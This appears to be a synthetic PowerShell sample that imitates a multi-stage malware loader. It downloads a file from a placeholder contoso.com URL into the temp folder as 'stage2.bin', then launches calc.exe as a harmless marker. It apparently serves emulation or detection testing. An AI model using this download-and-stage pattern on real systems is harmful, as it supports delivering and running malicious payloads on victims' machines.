
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$DownloadUrl = 'http://contoso.com/stage1.ps1',
    [string]$Stage2Path = "$env:TEMP\stage2.bin",
    [int]$ConnectionTimeout = 197
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $FetchResult = Invoke-StageDownload -SourceUrl $DownloadUrl -DestinationPath $Stage2Path -TimeoutSec $ConnectionTimeout
    if ($FetchResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$ProgressPreference = "SilentlyContinue"
Write-Output "stage 36 initialized"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
